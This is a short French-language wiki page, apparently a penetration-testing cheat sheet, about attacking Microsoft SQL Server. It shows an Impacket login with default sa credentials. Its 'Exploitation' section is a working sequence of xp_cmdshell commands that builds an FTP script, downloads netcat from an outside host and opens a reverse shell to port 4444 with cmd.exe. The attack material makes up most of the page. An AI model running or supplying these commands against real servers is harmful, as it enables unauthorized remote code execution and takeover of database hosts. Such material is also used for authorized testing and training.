---
title: Microsoft SQL Server
permalink: /Microsoft_SQL_Server/
---

Utilisation
-----------

### Connexion

[Impacket](/Impacket "wikilink") posséde un outil *mssqlclient.py*. L'exemple suivant permet de se connecter avec sa/password et d'executer les commandes contenues dans *commands.txt*:

``` bash
mssqlclient.py -port 27900 sa:password@192.168.31.227 -file commands.txt
```

### Commandes utiles

Exploitation
------------

### Créer un reverse shell

Les commandes suivantes créent un reverse shell en téléchargeant netcat depuis un serveur FTP.

``` text
EXEC master.dbo.xp_cmdshell 'echo open 192.168.30.229> ftp.txt';
EXEC master.dbo.xp_cmdshell 'echo USER user>> ftp.txt';
EXEC master.dbo.xp_cmdshell 'echo 12345>> ftp.txt';
EXEC master.dbo.xp_cmdshell 'echo bin>> ftp.txt';
EXEC master.dbo.xp_cmdshell 'echo GET nc.exe>> ftp.txt';
EXEC master.dbo.xp_cmdshell 'echo bye>> ftp.txt';
EXEC master.dbo.xp_cmdshell 'ftp -v -n -s:ftp.txt';
EXEC master.dbo.xp_cmdshell 'nc.exe -nv 192.168.30.229 4444 -e cmd.exe';
```

Ressources
----------

### Vidéos

-   [DerbyCon 2016 - SQL Server Hacking on Scale using PowerShell - Scott Sutherland](https://www.youtube.com/watch?v=xLbPztByc8M)

### Outils

-   [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

[Category:Technologies](/Category:Technologies "wikilink")